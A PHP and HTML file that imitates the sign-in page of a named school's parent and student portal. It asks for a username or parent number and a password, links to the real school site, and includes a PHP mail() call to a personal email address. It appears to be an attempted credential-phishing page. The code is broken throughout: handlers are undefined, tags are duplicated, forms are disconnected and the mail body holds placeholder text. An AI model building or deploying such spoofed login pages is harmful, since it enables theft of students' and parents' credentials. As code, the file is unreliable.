<?php
  $name = $_POST['name'];
  $visitor_email = $_POST['email'];
  $message = $_POST['message'];

  $email_from = 'owenmoxham@bigpond.com';

	$email_subject = "New Form submission";

	$email_body = "Hi";

	$to = "owenmoxham@bigpond.com";

	$headers = "Hello";

	mail($to,$email_subject,$email_body,$headers);
?>

<html lang="en">

<form method="POST" name="myemailform" action="index2.html">

Enter Name: <input type="text" name="name">

Enter Email Address:  <input type="text" name="email">

Enter Message:  <textarea name="message"></textarea>

<input type="submit" value="Send Form">
</form>

<head>
    
    <title>Defiently STL link</title>

    


<link href="main.css" rel="stylesheet">

    <style>
      
      
      
    </style>

    
    <!-- Custom styles for this template -->
    <link href="main.css" rel="stylesheet">
  </head>
  <body>
  	<header class="Hi">
  		
  	</header>
  		<div>
  			<nav>
  				
  			</nav>
  		</div>
  </body>

  <body onload="get()" class="Itest">
    <p id="savedText"> </p>
    <p id="openedText"> </p>
    <p>Hi</p>
  </body>
  	
<main class="form-signin">
  <form>
    <h3>Sign in with your St Leonard's account.</h3>
    <input type="Username" id="inputUsername" class="form-control" placeholder="Username or Parent number" required autofocus>
    <input type="password" id="input" class="former" placeholder="Password" value="input" required>
    <div class="checkbox mb-3">
      <label>
        <input type="checkbox" value="remember-me"> Keep me signed in
      </label>
    </div>
    <h4>If you have forgotten your password, please <a href="https://link.stleonards.vic.edu.au/news/8340">click here</a></h4>
    <h4>For further help with this site, <a href="https://link.stleonards.vic.edu.au/news/8340">email us</a></h4>
    <p class="mt-5 mb-3 text-muted">&copy; 2017-2021</p>
    <p class="testing">Text</p>
  </form>
  <a href="https://link.stleonards.vic.edu.au/news/8340"><button class="button" type="input" onclick="save()">Sign in</button></a>
</main>

<form method="post" name="myemailform" action="form-to-email.php">

Enter Name: <input type="text" name="name">

Enter Email Address:  <input type="text" name="email">

Enter Message:  <textarea name="message"></textarea>

<input type="submit" value="Send Form">
</form>


    
  </body>


</html>